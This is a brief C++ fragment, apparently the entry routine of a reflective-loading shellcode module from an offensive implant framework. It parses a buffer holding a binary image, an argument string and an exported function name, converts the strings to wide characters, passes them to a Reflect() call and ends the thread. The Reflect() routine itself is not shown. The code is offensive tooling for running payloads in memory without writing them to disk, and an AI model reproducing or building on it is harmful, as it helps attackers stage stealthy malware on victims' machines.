	Instance.Win32.DbgPrint("\n\n[+] Reflection shellcode started...\n");

	Parser::New(&Psr, ArgBuffer);

	ULONG  Length = 0;
	BYTE* Buffer = Parser::Bytes(&Psr, &Length);
	CHAR* Arguments = Parser::Str(&Psr);
	CHAR* ExportedFnName = Parser::Str(&Psr);

	ULONG ArgumentsL = (Str::LengthA(Arguments) + 1) * sizeof(WCHAR);
	ULONG ExportedFnNameL = (Str::LengthA(ExportedFnName) + 1) * sizeof(WCHAR);

	WCHAR wArguments[MAX_PATH * 2] = { 0 };
	WCHAR wExportedFnName[MAX_PATH * 2] = { 0 };

	Str::CharToWChar(wExportedFnName, ExportedFnName, ExportedFnNameL);
	Str::CharToWChar(wArguments, Arguments, ArgumentsL);

	ULONG Result = Reflect(Buffer, Length, wArguments, wExportedFnName);

	Parser::Destroy(&Psr);

	Instance.Win32.RtlExitUserThread(Result);
}